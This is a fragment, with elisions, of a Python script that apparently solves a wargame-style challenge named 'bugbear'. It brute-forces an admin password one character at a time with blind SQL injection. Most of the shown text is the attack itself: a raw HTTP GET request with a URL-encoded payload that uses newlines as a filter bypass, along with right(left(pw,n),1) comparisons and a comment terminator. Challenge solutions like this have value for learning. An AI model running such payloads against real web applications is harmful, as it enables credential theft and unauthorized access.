...
for n in range(1,9):
    for x in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=":
        ...
        data = "GET /bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no=12345%0a%7c%7c%0a(not%0a(right(left(pw,%0a" + str(n) + "),%0a1)%0a%3c%3e%0a%22" + str(x) + "%22)%0a%26%26%0anot%0a(id%0a%3c%3e%0a%22admin%22))%23&pw=1" + " HTTP/1.1\r\n" + \
